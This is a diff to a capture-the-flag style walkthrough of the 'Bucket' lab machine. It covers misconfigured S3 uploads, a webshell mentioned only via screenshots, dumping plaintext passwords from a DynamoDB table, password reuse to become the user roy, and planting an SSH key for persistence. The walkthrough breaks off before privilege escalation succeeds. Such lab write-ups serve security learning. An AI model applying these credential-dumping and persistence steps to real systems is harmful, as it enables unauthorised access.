@@ -60,22 +60,232 @@ My answers:
 
 "It may be misconfigured where we could upload files" - AL  - "Poorly configured permission is prevalent given the complexity of permissions in AWS"
 
-While Al struggle with install and dependency issues - he saved by Docker, I will spend a hour making all the Docker related infrastructure I need to basic setup, add scripts - also RustScan. 
+While Al struggle with install and dependency issues - he saved by Docker, I will spend a hour making all the Docker related infrastructure I need to basic setup, add scripts - also RustScan, which just making me want to write my own port scanner for various reasons:
+- Output is nasty
+- Why do you have to have `--accessible` flag to remove the the colours and flash that make it take longer
+- If it best to live in a docker container just to not destroy the kernel or file system, wtf is it actually doing and why does it even exist as software at level of prestige and not just give in a same it is a docker image wrapper around nmap.
+- Does not fit into an automation pipelines
+- Why wrap around nmap, when you are trying to replace Massscan?
+
 
 #### AWS vs Azure
 
+This got delayed slightly, but maybe for the best:
+- Azure in powershell and cloudcli uses credential as the raw object drawn from the system not a key stored in a Environment variable.
+- ARM templates could be used to reconfigure file system permissions for non-secure third party software after installation or batch reinstate permissions across a section of the file system.
+- Generally the SaaS for data storage
+
 ```bash
-sudo apt install aws-cli
+sudo apt install awscli
+# Configure Access Key ID, AWS Secret, region, Output 
+aws configure
 
+aws --endpoint-url http://s3.bucket.htb s3 ls
 
+# AWS Keys are commonly stored in environment variables
+aws --endpoint-url http://s3.bucket.htb --no-sign-request s3 ls adserver
+
+# s3 Subcommands
+# Single Object operations
+mv
+cp
+rm
+# Directory and s3 operations
+sync
+mb
+rb
+ls
 ```
+[AWS-CLI Subcommands](https://docs.aws.amazon.com/cli/latest/reference/)
+
+![](awsoclock.png)
+
+Prevent credential requesting
+![](preventcredntials.png)
 
 ## Exploit
 
+We can then upload a file as permissions are misconfigured therefore uploading a webshell would be the next move.
+![](fileupload.png)
+Although it is being removed. 
+![](ready.png)
+
 ## Foothold
+
+![](ready.png)
+I failed initialliy because I was target the s3. not the domain that is hosting the website
+![](hurray.png)
+
+.aws in the linux fstab root directory
+
+![](dotaws.png)
+
+```bash
+# host 
+stty -a
+# target
+stty rows $rows cols $cols
+```
+
+There is a Roy user with his project directory
+![](dynamodb.png)
+[Invocation_id](https://docs.aws.amazon.com/systems-manager/latest/userguide/mw-cli-register-tasks-parameters.html)
+```bash
+# Weird environment variable - The ID of the current invocation.
+INVOCATION_ID=8056c5bf40f84c21951e4aabbe71db0c
+```
+[Dynamo DB](dynamodb.png) - is a ["Fast, flexible NoSQL database service for single-digit millisecond performance at any scale"](https://aws.amazon.com/dynamodb/)
+![](autoloaderref.png)
+For [Dynamodb commands](https://docs.aws.amazon.com/cli/latest/reference/dynamodb/index.html)
+
+Importantly skipped over was the need to specify a home directory, because we are www-data
+```bash
+export HOME=/dev/shm
+```
+![1000](awsclitothedb.png)
+
+```bash
+aws dynamodb list-tables --endpoint-url http://localhost:4566 --no-sign-request
+```
+
+![](nosqlcliflagsahoy.png)
+[Querying a table](https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/SQLtoNoSQL.ReadData.Query.html), but Al was too quick - with `scan` 
+
+```bash
+www-data@bucket:/home/roy/project/vendor$ aws dynamodb scan --table-name users --endpoint-url http://localhost:4566 --no-sign-request
+```
+
+![](dbpasswords.png)
+```json
+{
+    "Items": [
+        {
+            "password": {
+                "S": "Management@#1@#"
+            },
+            "username": {
+                "S": "Mgmt"
+            }
+        },
+        {
+            "password": {
+                "S": "Welcome123!"
+            },
+            "username": {
+                "S": "Cloudadm"
+            }
+        },
+        {
+            "password": {
+                "S": "n2vM-<_K_Q:.Aa2"
+            },
+            "username": {
+                "S": "Sysadm"
+            }
+        }
+    ],
+    "Count": 3,
+    "ScannedCount": 3,
+    "ConsumedCapacity": null
+}
+```
+
 
 ## PrivEsc
 
+Password reuse or just that the sysadm is role that roy has
+`roy : n2vM-<_K_Q:.Aa2`
+![](suroy.png)
+Not made ssh key and used it as a second shell as I have always made other more hacker-y shells from binaries on the box to learn more hacker-y things
+```bash
+# provide some fields - roy_rsa
+ssh-keygen  
+# target 
+mkdir .ssh
+echo "ssh-rsa $base64fromkey" > .ssh/authorized_keys
+
+```
+and ssh in 
+![](sshin.png)
+
+We could not access bucket-app as www-data so probably this the vector of escalation. It uses Linux ACLs 
+```bash
+# Special permissions like: drwxr-x---+  
+getfacl $directory/file
+```
+![](getfaclsinyourbrain.png)
+With a weird jar file inside:
+![](weirdjar.png)
+Reading the index.php
+![](indexphpinthebucketapp.png)
+[passthru](https://www.php.net/manual/en/function.passthru.php) - The _passthru_() function is similar to the exec() function in that it executes a command . This function should be used in place of exec() or system() he output from the Unix command is binary data which needs to be passed directly back to the browser. 
+
+`passthru` being your box hardening for php file with system or exec
+
+```bash
+grep -r -e 'system(\|exec(' 2>/dev/null
+# Nuke the files
+sed -i 's/exec(/passthru(/g' $file
+sed -i 's/system(/passthru(/g' $file
+```
+
+As I was testing my battleground hopes and commands to run
+![](withthesshforwarding.png)
+```bash
+[SHIFT ~ C] # to drop to ssh shell
+ssh> -L 8000:localhost:8000
+```
+
+To index.php is going to:
+1. If post request made
+2. Perform a similar lookup with `scan` for some "S" - string name: Ransonware
+3. Make random filename in files/
+4. transforms the file at file/$random into pdf file result.pdf
+
+![](Igota200.png)
+Although... : (
+![](butnofilethere.png)
+
+Al thinks we need to make the table and attributes so that the table exists for the index.php function to occur.
+
+```bash
+aws dynamodb list-tables --endpoint-url http://localhost:4566
+aws dynamodb --endpoint-url http://localhost:4566
+# --table-name alerts
+# --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S --key-schema AttributeName=title,KeyType=HASH  AttributeName=data,KeyType=RANGE --provisioned-throughput ReadCapacityUnits=10,WriteCapacity=10
+
+```
+
+ChatGPT explains the code: *"This code is written in PHP and appears to be setting up a connection to a DynamoDB database and issuing a 'Scan' command to retrieve items from an 'alerts' table where the 'title' attribute is equal to 'Ransomware'. For each item retrieved, a random file name is generated, and the item's 'data' attribute is written to a file with that name in a 'files' directory. Then, a Java program is run, passing it the file name of the file just created and some other arguments. It is not clear what the purpose of this Java program is or what it does with the file."*
+
+Then ChatGPT asnwers what is the difference between a partition key and sort key in AWS:
+*"In Amazon DynamoDB, a primary key is used to uniquely identify an item in a table. There are two types of primary keys: a partition key, and a sort key. 
+
+*A partition key is a simple primary key that is made up of a single attribute. DynamoDB uses the partition key's value as input to an internal hash function, and the output value from the hash function determines the partition where the item is stored.*
+
+*A sort key is an optional attribute that you can use to further organize the items in a table. You can define a sort key as a secondary index and use it to filter and sort results.*
+
+*So, to summarize, the difference between a partition key and a sort key is that a partition key is used to distribute data across partitions, while a sort key is used to store data within a partition and to sort items within a partition."*
+
+I do not think my mind has ever melted this hard when working with databases, even MSSQL seems less verbose. The documentation does not seem great.
+
+![](thatisaninsaneamountofcmd.png)
+
+```bash
+aws dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S --key-schema AttributeName=title,KeyType=HASH  AttributeName=data,KeyType=RANGE --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=10 --endpoint-url http://localhost:4566
+
+aws dynamodb put-item --table-name alerts --item '{"title": {"S": "Ransomware"}, "data": {"S": "maddata"}}' --endpoint-url http://localhost:4566
+```
+[create-table](https://docs.aws.amazon.com/cli/latest/reference/dynamodb/create-table.html), [put-item](https://docs.aws.amazon.com/cli/latest/reference/dynamodb/put-item.html)
+
+![](holyaaaawwwwssss.png)
+
+I typo-ed Ransomware as I obviously have not had to type it into every report yet.
+
+![](chatgptisinsane.png)
+
+Something went wrong along the way such that the files did not get created. - at https://www.youtube.com/watch?v=vSug24hrQdo
+
 ## Beyond Root
 
-      
+Well I added a hardening and persistence method throughout this, so this will be the Azure and AWS. 
